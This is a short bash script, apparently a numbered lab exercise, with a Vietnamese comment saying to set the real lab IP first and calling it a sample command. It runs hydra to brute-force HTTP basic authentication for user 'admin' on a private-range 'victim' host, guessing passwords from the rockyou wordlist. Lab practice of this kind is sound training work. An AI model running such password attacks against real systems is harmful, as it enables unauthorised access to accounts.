#!/bin/bash
# 08-http-basic-auth-bruteforce — SUA IP cho dung lab that truoc khi chay. Day la lenh mau.
VICTIM="192.168.100.20"
hydra -l admin -P /usr/share/wordlists/rockyou.txt "$VICTIM" http-get /private
